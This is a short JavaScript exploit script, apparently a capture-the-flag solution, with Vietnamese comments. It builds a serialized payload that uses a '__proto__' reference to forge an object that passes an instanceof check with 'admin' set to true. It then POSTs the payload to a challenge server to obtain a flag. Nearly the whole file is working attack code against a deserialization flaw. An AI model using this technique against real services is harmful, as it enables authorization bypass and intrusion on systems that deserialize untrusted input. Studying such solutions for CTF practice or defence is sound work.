// Payload logic:
// Index 0: Object giả mạo (Fake Object)
//    - Có "admin": true (trỏ tới index 2)
//    - Có "__proto__": trỏ tới index 1 (FlagRequest thật) -> Để lừa instanceof
// Index 1: Instance thật của FlagRequest (được tạo ra để làm cha cho Index 0)
// Index 2: Giá trị true
// Index 3: Mảng chứa tham số cho FlagRequest (Index 4)
// Index 4: Object rỗng (tham số feedback)

const payload = '[{"admin":2,"__proto__":1},["FlagRequest",3],true,[4],{}]';

console.log("Sending Payload:", payload);

fetch('https://web-desafe-nchq441e.amt.rs/', {
    method: 'POST',
    headers: {
        'Content-Type': 'text/plain'
    },
    body: payload
})
.then(async res => {
    console.log("Status:", res.status);
    const text = await res.text();
    console.log("Response:", text);
})
.catch(err => console.error("Error:", err));